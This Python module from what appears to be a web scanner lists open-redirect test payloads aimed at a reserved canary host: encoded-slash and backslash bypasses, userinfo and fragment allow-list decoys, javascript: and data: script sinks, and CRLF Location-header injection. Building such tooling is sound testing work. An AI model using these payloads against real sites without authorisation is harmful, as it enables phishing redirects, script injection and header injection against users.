"""
Module: talos.open_redirect.payloads

Purpose:
    Open-redirect payload catalogue.

    Payloads **replace** the captured field. ``{REDIR}`` is the canary
    host (default ``talos-or.invalid``). Detection looks for a new
    Location / Refresh / meta / JS redirect to that host — not payload
    echo in the HTML body.

    Families:
        absolute   — https:// / http:// canary
        proto_rel  — //canary
        slash      — /\\/, \\/\\/, extra slashes
        encoded    — percent / double-percent / mixed separators
        userinfo   — trusted@canary / canary#@trusted
        data_js    — javascript: and data: sinks
        fragment   — # and suffix confusion
        crlf       — header injection via the redirect parameter

Dependencies: talos.open_redirect.models
Data flow: CLI / engine → generate_open_redirect_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional

from talos.open_redirect.models import (
    CANARY_HOST,
    FAMILIES,
    FAMILY_ABSOLUTE,
    FAMILY_CRLF,
    FAMILY_DATA_JS,
    FAMILY_ENCODED,
    FAMILY_FRAGMENT,
    FAMILY_PROTO_REL,
    FAMILY_SLASH,
    FAMILY_USERINFO,
    INJECT_REPLACE,
    INJECT_SUFFIX,
    OpenRedirectPayload,
)


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    inject_mode: str = INJECT_REPLACE,
) -> OpenRedirectPayload:
    """Purpose: Build one catalogue row."""
    return OpenRedirectPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        inject_mode=inject_mode,
    )


def _base_payloads() -> list[OpenRedirectPayload]:
    """Purpose: Full raw catalogue."""
    return [
        # ---- Absolute ----------------------------------------------------
        _payload(
            technique="abs_https",
            family=FAMILY_ABSOLUTE,
            payload="https://{REDIR}/",
            description="Absolute https:// canary.",
        ),
        _payload(
            technique="abs_http",
            family=FAMILY_ABSOLUTE,
            payload="http://{REDIR}/",
            description="Absolute http:// canary.",
        ),
        _payload(
            technique="abs_https_path",
            family=FAMILY_ABSOLUTE,
            payload="https://{REDIR}/login",
            description="Absolute https:// canary with a path.",
        ),
        _payload(
            technique="abs_https_query",
            family=FAMILY_ABSOLUTE,
            payload="https://{REDIR}/?next=/",
            description="Absolute https:// canary with a query.",
        ),
        _payload(
            technique="abs_suffix",
            family=FAMILY_ABSOLUTE,
            payload="https://{REDIR}/",
            description="Append https://canary onto the original value.",
            inject_mode=INJECT_SUFFIX,
        ),
        # ---- Protocol-relative ------------------------------------------
        _payload(
            technique="pr_slash",
            family=FAMILY_PROTO_REL,
            payload="//{REDIR}/",
            description="Protocol-relative //canary/.",
        ),
        _payload(
            technique="pr_encoded",
            family=FAMILY_PROTO_REL,
            payload="//%2f{REDIR}/",
            description="Protocol-relative with encoded extra slash.",
        ),
        # ---- Slash / backslash bypass -----------------------------------
        _payload(
            technique="slash_mixed",
            family=FAMILY_SLASH,
            payload="/\\/{REDIR}/",
            description="Mixed /\\/canary (IIS / ASP.NET).",
        ),
        _payload(
            technique="slash_escaped",
            family=FAMILY_SLASH,
            payload="\\/\\/{REDIR}/",
            description="Escaped \\/\\/canary.",
        ),
        _payload(
            technique="slash_quad",
            family=FAMILY_SLASH,
            payload="////{REDIR}/",
            description="Four slashes ////canary/.",
        ),
        _payload(
            technique="slash_back",
            family=FAMILY_SLASH,
            payload="/\\\\{REDIR}/",
            description="Backslash after a single slash.",
        ),
        _payload(
            technique="slash_tab",
            family=FAMILY_SLASH,
            payload="/%09/{REDIR}/",
            description="Tab between slashes /%09/canary/.",
        ),
        _payload(
            technique="slash_enc",
            family=FAMILY_SLASH,
            payload="/%2f%2f{REDIR}/",
            description="Encoded slashes /%2f%2fcanary/.",
        ),
        # ---- Encoded -----------------------------------------------------
        _payload(
            technique="enc_scheme_slash",
            family=FAMILY_ENCODED,
            payload="https:%2f%2f{REDIR}/",
            description="https: with encoded slashes.",
        ),
        _payload(
            technique="enc_host_dot",
            family=FAMILY_ENCODED,
            payload="https://talos-or%2einvalid/",
            description="Percent-encoded dot in the canary host.",
        ),
        _payload(
            technique="enc_double",
            family=FAMILY_ENCODED,
            payload="%2f%2f{REDIR}/",
            description="Bare %2f%2fcanary/ (decoded by some stacks).",
        ),
        _payload(
            technique="enc_backslash",
            family=FAMILY_ENCODED,
            payload="%5c%5c{REDIR}/",
            description="Encoded backslashes %5c%5ccanary/.",
        ),
        _payload(
            technique="enc_hash",
            family=FAMILY_ENCODED,
            payload="https://{REDIR}%23.whitelisted.example",
            description="Encoded # so a suffix looks like a whitelist host.",
        ),
        _payload(
            technique="enc_null",
            family=FAMILY_ENCODED,
            payload="https://{REDIR}%00.whitelisted.example",
            description="Null-byte after canary host (legacy parsers).",
        ),
        # ---- Userinfo ----------------------------------------------------
        _payload(
            technique="ui_at",
            family=FAMILY_USERINFO,
            payload="https://whitelisted.example@{REDIR}/",
            description="https://trusted@canary/ (userinfo wins).",
        ),
        _payload(
            technique="ui_hash_at",
            family=FAMILY_USERINFO,
            payload="https://{REDIR}#@whitelisted.example",
            description="https://canary#@trusted (fragment decoy).",
        ),
        _payload(
            technique="ui_bare_at",
            family=FAMILY_USERINFO,
            payload="https://trusted@{REDIR}",
            description="https://trusted@canary without trailing slash.",
        ),
        # ---- javascript: / data: ----------------------------------------
        _payload(
            technique="js_alert",
            family=FAMILY_DATA_JS,
            payload="javascript:alert(1)",
            description="javascript:alert(1) (XSS via redirect).",
        ),
        _payload(
            technique="js_location",
            family=FAMILY_DATA_JS,
            payload="javascript:window.location='https://{REDIR}/'",
            description="javascript: assigns location to the canary.",
        ),
        _payload(
            technique="js_proto",
            family=FAMILY_DATA_JS,
            payload="javascript://{REDIR}",
            description="javascript://canary (scheme smuggle).",
        ),
        _payload(
            technique="data_html",
            family=FAMILY_DATA_JS,
            payload="data:text/html,<script>location='https://{REDIR}/'</script>",
            description="data: HTML that navigates to the canary.",
        ),
        # ---- Fragment / suffix confusion --------------------------------
        _payload(
            technique="frag_hash",
            family=FAMILY_FRAGMENT,
            payload="https://{REDIR}#@whitelisted",
            description="Canary with # fragment decoy.",
        ),
        _payload(
            technique="frag_dot_suffix",
            family=FAMILY_FRAGMENT,
            payload="https://{REDIR}.whitelisted.example/",
            description="Canary as a subdomain of a trusted-looking suffix.",
        ),
        _payload(
            technique="frag_backslash",
            family=FAMILY_FRAGMENT,
            payload="https://{REDIR}\\.whitelisted.example/",
            description="Backslash before a trusted-looking suffix.",
        ),
        # ---- CRLF header injection --------------------------------------
        _payload(
            technique="crlf_location",
            family=FAMILY_CRLF,
            payload="%0d%0aLocation:%20https://{REDIR}/",
            description="CRLF injected Location: canary.",
        ),
        _payload(
            technique="crlf_path",
            family=FAMILY_CRLF,
            payload="/%0d%0aLocation:%20https://{REDIR}/",
            description="Path-prefixed CRLF Location: canary.",
        ),
        _payload(
            technique="crlf_after_url",
            family=FAMILY_CRLF,
            payload="https://whitelisted.example%0d%0aLocation:%20https://{REDIR}/",
            description="Trusted URL then CRLF Location: canary.",
        ),
    ]


TECHNIQUE_CATALOG: tuple[dict[str, object], ...] = tuple(
    {
        "name": item.technique,
        "family": item.family,
        "description": item.description,
        "inject_mode": item.inject_mode,
    }
    for item in _base_payloads()
)

TECHNIQUE_NAMES: tuple[str, ...] = tuple(str(item["name"]) for item in TECHNIQUE_CATALOG)
TECHNIQUE_BY_NAME: dict[str, dict[str, object]] = {
    str(item["name"]): item for item in TECHNIQUE_CATALOG
}

DEFAULT_PAYLOAD_COUNT = len(TECHNIQUE_CATALOG)


def render_payload(
    item: OpenRedirectPayload,
    original: str,
    *,
    canary_host: str = CANARY_HOST,
) -> str:
    """
    Purpose:
        Materialize {REDIR} and suffix-join when needed.
    Output:
        Replacement string ready to inject.
    """
    host = (canary_host or CANARY_HOST).strip().lower().rstrip(".")
    rendered = item.payload.replace("{REDIR}", host)
    if item.inject_mode == INJECT_SUFFIX and (original or "").strip():
        base = original.rstrip("/")
        extra = rendered
        if extra.startswith(("http://", "https://", "//", "javascript:", "data:")):
            sep = "/" if "?" not in base and "#" not in base else ""
            return f"{base}{sep}{extra}"
        return f"{base}/{extra.lstrip('/')}"
    return rendered


def generate_open_redirect_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
) -> list[OpenRedirectPayload]:
    """
    Purpose:
        Return catalogue rows filtered by --technique / --family.
    Output:
        Non-empty list. Raises ValueError on unknown filters.
    """
    payloads = list(_base_payloads())
    if families:
        allow_fam = {name.strip() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown open-redirect family: "
                + ", ".join(sorted(unknown_fam))
                + f". Expected one of: {', '.join(FAMILIES)}"
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = {item.technique for item in _base_payloads()}
        unknown = allow - known
        if unknown:
            raise ValueError(
                "unknown open-redirect technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [item for item in payloads if item.technique in allow]
        missing = allow - {item.technique for item in payloads}
        if missing:
            raise ValueError(
                "open-redirect technique(s) not available for the selected "
                "family: " + ", ".join(sorted(missing))
            )
    return payloads
